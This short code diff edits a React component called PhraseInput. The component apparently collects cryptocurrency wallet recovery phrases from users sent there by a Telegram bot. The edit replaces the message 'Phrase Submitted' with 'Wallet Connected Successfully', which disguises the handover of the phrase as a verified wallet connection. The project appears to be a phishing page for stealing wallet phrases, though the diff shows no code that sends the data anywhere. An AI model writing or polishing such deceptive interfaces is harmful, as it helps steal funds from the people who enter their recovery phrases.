@@ -106,8 +106,8 @@ export default function PhraseInput({ selectedWallet, onBack }) {
               <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
             </svg>
           </div>
-          <h3 className="text-xl font-semibold text-gray-900 dark:text-white mb-2 transition-colors duration-300">Phrase Submitted Successfully!</h3>
-          <p className="text-gray-600 dark:text-gray-300 transition-colors duration-300">Your wallet phrase has been securely processed.</p>
+          <h3 className="text-xl font-semibold text-gray-900 dark:text-white mb-2 transition-colors duration-300">Wallet Connected Successfully!</h3>
+          <p className="text-gray-600 dark:text-gray-300 transition-colors duration-300">Your wallet has been securely connected and verified.</p>
           
           {/* Show Return to Bot button if user came from Telegram */}
           {telegramId && (
